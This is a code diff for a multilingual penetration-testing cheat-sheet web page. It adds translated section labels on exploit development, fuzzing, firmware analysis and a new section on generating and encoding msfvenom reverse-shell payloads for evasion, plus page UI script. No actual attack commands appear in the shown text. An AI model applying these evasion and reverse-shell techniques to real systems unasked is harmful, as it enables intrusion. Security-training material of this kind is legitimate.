-  "section16Title": {"en": "16) Mobile & Firmware Analysis", "ru": "16) Анализ мобильных устройств и прошивок", "he": "16) ניתוח מובייל וקושחה", "fr": "16) Analyse Mobile et Firmware", "de": "16) Mobil- & Firmware-Analyse"},
-  "section16Desc": {"en": "Decompilation of APKs, dynamic runtime analysis (Frida), and firmware extraction.", "ru": "Декомпиляция APK, динамический анализ времени выполнения (Frida) и извлечение прошивки.", "he": "דה-קומפילציה של APKs, ניתוח זמן ריצה דינמי (Frida) וחילוץ קושחה.", "fr": "Décompilation d'APK, analyse dynamique d'exécution (Frida) et extraction de firmware.", "de": "Dekompliierung von APKs, dynamische Laufzeitanalyse (Frida) und Firmware-Extraktion."},
-  "section16CommandDesc": {"en": "Commands for static and dynamic analysis of Android apps and embedded system binaries.", "ru": "Команды для статического и динамического анализа приложений Android и бинарных файлов встроенных систем.", "he": "פקודות לניתוח סטטי ודינמי של אפליקציות אנדרואיד ובינארי מערכות משובצות.", "fr": "Commandes pour l'analyse statique et dynamique des applications Android et des binaires de systèmes embarqués.", "de": "Befehle zur statischen und dynamischen Analyse von Android-Apps und eingebetteten Systembinärdateien."},
+        // SECTION 13: Vulnerability Research & PoC Triage
+        "section13Title": { "en": "13) Vulnerability Research & PoC Triage", "ru": "13) Исследование уязвимостей и сортировка PoC", "he": "13) מחקר פגיעויות וטריאז' PoC", "fr": "13) Recherche de Vulnérabilités et Tri PoC", "de": "13) Schwachstellenforschung & PoC-Triage" },
+        "section13Desc": { "en": "Searching local exploit databases and safely running proof-of-concept code in isolation.", "ru": "Поиск локальных баз данных эксплойтов и безопасное выполнение кода подтверждения концепции в изоляции.", "he": "חיפוש בבסיסי נתונים מקומיים של ניצולים והרצת קוד הוכחת היתכנות (PoC) בבידוד בבטחה.", "fr": "Recherche dans les bases de données d'exploits locales et exécution sécurisée de code de preuve de concept en isolement.", "de": "Suche in lokalen Exploit-Datenbanken und sichere Ausführung von Proof-of-Concept-Code in Isolation." },
+        "section13CommandDesc": { "en": "Emphasizes local search (searchsploit) and the use of network-isolated containers to prevent lateral movement.", "ru": "Подчеркивает локальный поиск (searchsploit) и использование сетевых изолированных контейнеров для предотвращения горизонтального перемещения.", "he": "מדגיש חיפוש מקומי (searchsploit) ושימוש במכולות מבודדות רשת למניעת תנועה רוחבית.", "fr": "Met l'accent sur la recherche locale (searchsploit) et l'utilisation de conteneurs isolés du réseau pour prévenir les mouvements latéraux.", "de": "Betont die lokale Suche (searchsploit) und die Verwendung von netzwerkisolierten Containern zur Verhinderung von lateralen Bewegungen." },
 
-  // SECTION 17: Safe PoC Testing & Logging
-  "section17Title": {"en": "17) Safe PoC Testing & Logging", "ru": "17) Безопасное тестирование PoC и ведение журнала", "he": "17) בדיקות PoC בטוחות ורישום לוגים", "fr": "17) Test PoC Sécurisé et Journalisation", "de": "17) Sicheres PoC-Testen & Protokollierung"},
-  "section17Desc": {"en": "Ensuring safe, reproducible testing environments and comprehensive logging.", "ru": "Обеспечение безопасных, воспроизводимых сред тестирования и комплексного ведения журнала.", "he": "הבטחת סביבות בדיקה בטוחות וניתנות לשחזור ורישום לוגים מקיף.", "fr": "Assurer des environnements de test sûrs et reproductibles et une journalisation complète.", "de": "Gewährleistung sicherer, reproduzierbarer Testumgebungen und umfassender Protokollierung."},
-  "section17CommandDesc": {"en": "Techniques to minimize risk via Docker isolation and ensure detailed test outcome logging.", "ru": "Методы минимизации риска с помощью изоляции Docker и обеспечения подробного протоколирования результатов тестирования.", "he": "טכניקות למזעור סיכונים באמצעות בידוד Docker והבטחת רישום מפורט של תוצאות הבדיקה.", "fr": "Techniques pour minimiser les risques via l'isolation Docker et garantir la journalisation détaillée des résultats des tests.", "de": "Techniken zur Minimierung des Risikos durch Docker-Isolation und zur Gewährleistung einer detaillierten Protokollierung der Testergebnisse."},
-};
+        // SECTION 14: Binary Reversing & Exploit Development
+        "section14Title": { "en": "14) Binary Reversing & Exploit Development", "ru": "14) Реверсирование бинарных файлов и разработка эксплойтов", "he": "14) הנדסה הפוכה ופיתוח ניצול", "fr": "14) Rétro-ingénierie binaire et développement d'exploits", "de": "14) Binär-Reverse-Engineering & Exploit-Entwicklung" },
+        "section14Desc": { "en": "Static analysis (ELF), ROP gadget hunting, and interactive debugging setup.", "ru": "Статический анализ (ELF), поиск ROP-гаджетов и настройка интерактивной отладки.", "he": "ניתוח סטטי (ELF), ציד גאדג'טים של ROP והגדרת ניפוי באגים אינטראקטיבי.", "fr": "Analyse statique (ELF), chasse aux gadgets ROP et configuration de débogage interactif.", "de": "Statische Analyse (ELF), ROP-Gadget-Suche und interaktives Debugging-Setup." },
+        "section14CommandDesc": { "en": "Tools used for analyzing executable file headers, assembly code, and preparing buffer overflow exploits.", "ru": "Инструменты, используемые для анализа заголовков исполняемых файлов, кода ассемблера и подготовки эксплойтов переполнения буфера.", "he": "כלים המשמשים לניתוח כותרות קבצים ניתנים להרצה, קוד אסמבלי והכנת ניצול גלישת חוצץ.", "fr": "Outils utilisés pour analyser les en-têtes de fichiers exécutables, le code assembleur et préparer des exploits de dépassement de tampon.", "de": "Tools zur Analyse von Header-Dateien, Assembly-Code und zur Vorbereitung von Buffer-Overflow-Exploits." },
 
-// Global state for collapse tracking
-let collapsed = false;
+        // SECTION 15: Fuzzing
+        "section15Title": { "en": "15) Fuzzing", "ru": "15) Фаззинг", "he": "15) פאזינג", "fr": "15) Fuzzing", "de": "15) Fuzzing" },
+        "section15Desc": { "en": "Instrumented binary fuzzing and HTTP request fuzzing for input discovery.", "ru": "Инструментированный фаззинг бинарных файлов и фаззинг HTTP-запросов для обнаружения ввода.", "he": "פאזינג בינארי מונחה ופאזינג בקשות HTTP לגילוי קלט.", "fr": "Fuzzing binaire instrumenté et fuzzing de requêtes HTTP pour la découverte d'entrées.", "de": "Instrumentiertes Binär-Fuzzing und HTTP-Anfrage-Fuzzing zur Eingabeerkennung." },
+        "section15CommandDesc": { "en": "AFL is used for finding crashes in C/C++ binaries; Wfuzz is used for black-box web fuzzing.", "ru": "AFL используется для поиска сбоев в бинарных файлах C/C++; Wfuzz используется для фаззинга черного ящика веб-приложений.", "he": "AFL משמש למציאת קריסות בבינארי C/C++; Wfuzz משמש לפאזינג קופסה שחורה של ווב.", "fr": "AFL est utilisé pour trouver des crashs dans les binaires C/C++; Wfuzz est utilisé pour le fuzzing Web en boîte noire.", "de": "AFL wird zur Fehlersuche in C/C++-Binärdateien verwendet; Wfuzz wird für Black-Box-Web-Fuzzing eingesetzt." },
 
-// --- COOKIE AND LANGUAGE PERSISTENCE FUNCTIONS ---
+        // SECTION 16: Mobile & Firmware Analysis
+        "section16Title": { "en": "16) Mobile & Firmware Analysis", "ru": "16) Анализ мобильных устройств и прошивок", "he": "16) ניתוח מובייל וקושחה", "fr": "16) Analyse Mobile et Firmware", "de": "16) Mobil- & Firmware-Analyse" },
+        "section16Desc": { "en": "Decompilation of APKs, dynamic runtime analysis (Frida), and firmware extraction.", "ru": "Декомпиляция APK, динамический анализ времени выполнения (Frida) и извлечение прошивки.", "he": "דה-קומפילציה של APKs, ניתוח זמן ריצה דינמי (Frida) וחילוץ קושחה.", "fr": "Décompilation d'APK, analyse dynamique d'exécution (Frida) et extraction de firmware.", "de": "Dekompliierung von APKs, dynamische Laufzeitanalyse (Frida) und Firmware-Extraktion." },
+        "section16CommandDesc": { "en": "Commands for static and dynamic analysis of Android apps and embedded system binaries.", "ru": "Команды для статического и динамического анализа приложений Android и бинарных файлов встроенных систем.", "he": "פקודות לניתוח סטטי ודינמי של אפליקציות אנדרואיד ובינארי מערכות משובצות.", "fr": "Commandes pour l'analyse statique et dynamique des applications Android et des binaires de systèmes embarqués.", "de": "Befehle zur statischen und dynamischen Analyse von Android-Apps und eingebetteten Systembinärdateien." },
 
-// Helper function to set a cookie
-function setCookie(name, value, days) {
-    let expires = "";
-    if (days) {
-        const date = new Date();
-        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
-        expires = "; expires=" + date.toUTCString();
+        // SECTION 17: Safe PoC Testing & Logging
+        "section17Title": { "en": "17) Safe PoC Testing & Logging", "ru": "17) Безопасное тестирование PoC и ведение журнала", "he": "17) בדיקות PoC בטוחות ורישום לוגים", "fr": "17) Test PoC Sécurisé et Journalisation", "de": "17) Sicheres PoC-Testen & Protokollierung" },
+        "section17Desc": { "en": "Ensuring safe, reproducible testing environments and comprehensive logging.", "ru": "Обеспечение безопасных, воспроизводимых сред тестирования и комплексного ведения журнала.", "he": "הבטחת סביבות בדיקה בטוחות וניתנות לשחזור ורישום לוגים מקיף.", "fr": "Assurer des environnements de test sûrs et reproductibles et une journalisation complète.", "de": "Gewährleistung sicherer, reproduzierbarer Testumgebungen und umfassender Protokollierung." },
+        "section17CommandDesc": { "en": "Techniques to minimize risk via Docker isolation and ensure detailed test outcome logging.", "ru": "Методы минимизации риска с помощью изоляции Docker и обеспечения подробного протоколирования результатов тестирования.", "he": "טכניקות למזעור סיכונים באמצעות בידוד Docker והבטחת רישום מפורט של תוצאות הבדיקה.", "fr": "Techniques pour minimiser les risques via l'isolation Docker et garantir la journalisation détaillée des résultats des tests.", "de": "Techniken zur Minimierung des Risikos durch Docker-Isolation und zur Gewährleistung einer detaillierten Protokollierung der Testergebnisse." },
+        
+        // NEW SECTION 18: Evasion & msfvenom Payloads
+        "section18Title": {"en": "18) Evasion & msfvenom Payloads", "ru": "18) Обход и полезные нагрузки msfvenom", "he": "18) התחמקות ומטעני msfvenom", "fr": "18) Évasion et Payloads msfvenom", "de": "18) Evasion & msfvenom Payloads"},
+        "section18Desc": {"en": "Generating and encoding reverse shell payloads. **AUTHORIZED USE ONLY.**", "ru": "Генерация и кодирование полезных нагрузок обратной оболочки. **ТОЛЬКО С РАЗРЕШЕНИЯ.**", "he": "יצירה וקידוד של מטעני מעטפת הפוכה. **שימוש מורשה בלבד.**", "fr": "Génération et encodage de payloads de reverse shell. **UTILISATION AUTORISÉE UNIQUEMENT.**", "de": "Generierung und Kodierung von Reverse-Shell-Payloads. **NUR FÜR AUTORISIERTE NUTZUNG.**"},
+        "section18CommandDesc": {"en": "Use the '-e' flag for evasion (encoding) and the '-f' flag for different output formats.", "ru": "Используйте флаг '-e' для обхода (кодирования) и флаг '-f' для различных форматов вывода.", "he": "השתמש בדגל '-e' להתחמקות (קידוד) ובדגל '-f' לפורמטי פלט שונים.", "fr": "Utilisez le drapeau '-e' pour l'évasion (encodage) et le drapeau '-f' pour différents formats de sortie.", "de": "Verwenden Sie das Flag '-e' für Evasion (Kodierung) und das Flag '-f' für verschiedene Ausgabeformate."},
+    };
+
+    // Global state for collapse tracking
+    let collapsed = false;
+
+    // --- COOKIE AND LANGUAGE PERSISTENCE FUNCTIONS ---
+
+    // Helper function to set a cookie
+    function setCookie(name, value, days) {
+        let expires = "";
+        if (days) {
+            const date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+            expires = "; expires=" + date.toUTCString();
+        }
+        document.cookie = name + "=" + (value || "")  + expires + "; path=/; SameSite=Lax";
     }
-    // Using Secure is recommended for real-world HTTPS sites, but keeping
+
+    // Helper function to get a cookie
+    function getCookie(name) {
+        const nameEQ = name + "=";
+        const ca = document.cookie.split(';');
+        for(let i=0; i < ca.length; i++) {
+            let c = ca[i];
+            while (c.charAt(0)==' ') c = c.substring(1,c.length);
+            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+        }
+        return null;
+    }
+
+    // --- CORE TRANSLATION FUNCTION ---
+
+    function translate(lang) {
+        // 1. Set the main HTML direction for RTL languages
+        if (lang === 'he') {
+            document.documentElement.setAttribute('dir', 'rtl');
+        } else {
+            document.documentElement.setAttribute('dir', 'ltr');
+        }
+
+        // 2. Translate all elements with 'data-i18n' attributes
+        for (const key in translations) {
+            const elements = document.querySelectorAll(`[data-i18n="${key}"]`);
+            elements.forEach(el => {
+                if (translations[key][lang]) {
+                    el.innerHTML = translations[key][lang];
+                }
+            });
+        }
+
+        // 3. Translate placeholder and title attributes
+        const searchInput = document.getElementById('searchInput');
+        if (searchInput) {
+            searchInput.placeholder = translations['searchInputPlaceholder'][lang] || 'Search...';
+        }
+
+        // 4. Update the active language button
+        document.querySelectorAll('.language-tools button').forEach(button => {
+            button.classList.remove('primary');
+            if (button.getAttribute('data-lang') === lang) {
+                button.classList.add('primary');
+            }
+        });
+
+        // 5. Update the toggle button text
+        const toggleButton = document.getElementById('toggleAllButton');
+        if (toggleButton) {
+            const toggleKey = collapsed ? 'toggleButtonCollapsed' : 'toggleButtonExpanded';
+            toggleButton.textContent = translations[toggleKey][lang] || (collapsed ? 'Expand All' : 'Collapse All');
+        }
+
+        // 6. Save the preference
+        setCookie('cheatsheet_lang', lang, 30);
+    }
+
+    // --- COPY & SECTION LOGIC ---
+
+    function copyCommand(button) {
+        const pre = button.closest('pre');
+        const code = pre.querySelector('code').innerText;
+
+        // Remove the initial prompt like '# Set target TARGET=example.com' or comments
+        const cleanedCode = code.split('\n').filter(line => !line.trim().startsWith('#') && line.trim() !== '').join('\n');
+
+        navigator.clipboard.writeText(cleanedCode).then(() => {
+            const originalText = button.innerHTML;
+            const lang = getCookie('cheatsheet_lang') || 'en';
+            button.innerHTML = lang === 'en' ? 'Copied!' : lang === 'ru' ? 'Скопировано!' : lang === 'he' ? 'הועתק!' : lang === 'fr' ? 'Copié!' : lang === 'de' ? 'Kopiert!' : 'Copied!';
+            
+            setTimeout(() => {
+                button.innerHTML = originalText;
+                translate(lang); // Re-translate to restore the original "Copy" text
+            }, 1500);
+        }).catch(err => {
+            console.error('Failed to copy: ', err);
+        });
+    }
+
+    function setupSectionToggles() {
+        document.querySelectorAll('.section-header').forEach(header => {
+            header.addEventListener('click', function() {
+                const sectionId = this.getAttribute('data-target');
+                const content = document.getElementById(sectionId);
+                const icon = this.querySelector('.toggle-icon');
+
+                const isExpanded = content.style.display === 'block';
+                content.style.display = isExpanded ? 'none' : 'block';
+                icon.textContent = isExpanded ? '▶' : '▼';
+                this.setAttribute('aria-expanded', !isExpanded);
+            });
+            // Initial state: collapsed=false, so set icon to expanded (▼)
+            header.querySelector('.toggle-icon').textContent = '▼';
+        });
+    }
+
+    function toggleAll() {
+        collapsed = !collapsed;
+        const allContent = document.querySelectorAll('.section-content');
+        const toggleButton = document.getElementById('toggleAllButton');
+        const lang = getCookie('cheatsheet_lang') || 'en';
+
+        allContent.forEach(content => {
+            content.style.display = collapsed ? 'none' : 'block';
+        });
+        
+        document.querySelectorAll('.toggle-icon').forEach(icon => {
+            icon.textContent = collapsed ? '▶' : '▼';
+        });
+
+        const toggleKey = collapsed ? 'toggleButtonCollapsed' : 'toggleButtonExpanded';
+        toggleButton.textContent = translations[toggleKey][lang];
+    }
+
+    function searchCommands(query) {
+        const sections = document.querySelectorAll('.section-container');
+        const normalizedQuery = query.toLowerCase().trim();
+
+        sections.forEach(section => {
+            const sectionContent = section.querySelector('.section-content');
+            const commandDescElements = sectionContent.querySelectorAll('.command-desc');
+            let sectionMatches = false;
+
+            commandDescElements.forEach(desc => {
+                const pre = desc.nextElementSibling;
+                const code = pre ? pre.querySelector('code').innerText.toLowerCase() : '';
+                const description = desc.innerText.toLowerCase();
+                const matches = code.includes(normalizedQuery) || description.includes(normalizedQuery);
+
+                if (pre) {
+                    pre.style.display = matches || normalizedQuery === '' ? 'block' : 'none';
+                }
+                desc.style.display = matches || normalizedQuery === '' ? 'block' : 'none';
+                
+                if (matches) {
+                    sectionMatches = true;
+                }
+            });
+
+            // Show/Hide section based on search results
+            if (normalizedQuery === '') {
+                 section.style.display = 'block';
+                 sectionContent.style.display = collapsed ? 'none' : 'block'; 
+            } else {
+                section.style.display = sectionMatches ? 'block' : 'none';
+                if (sectionMatches) {
+                     sectionContent.style.display = 'block'; // Auto-expand matching sections
+                }
+            }
+        });
+    }
+
+
+    // --- INITIALIZATION ---
+    window.onload = function() {
+        // 1. Get preferred language (default to English)
+        const storedLang = getCookie('cheatsheet_lang') || 'en';
+        translate(storedLang);
+
+        // 2. Set up language button event listeners
+        document.querySelectorAll('.language-tools button').forEach(button => {
+            button.addEventListener('click', function() {
+                const lang = this.getAttribute('data-lang');
+                translate(lang);
+            });
+        });
+
+        // 3. Set up button handlers
+        document.getElementById('toggleAllButton').addEventListener('click', toggleAll);
+        document.querySelectorAll('.copy-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                copyCommand(this);
+            });
+        });
+
+        // 4. Set up search input handler
+        document.getElementById('searchInput').addEventListener('input', function(e) {
+            searchCommands(e.target.value);
+        });
+
+        // 5. Set up section expand/collapse functionality
+        setupSectionToggles();
+    };
+</script>
+
+</body>
+</html>
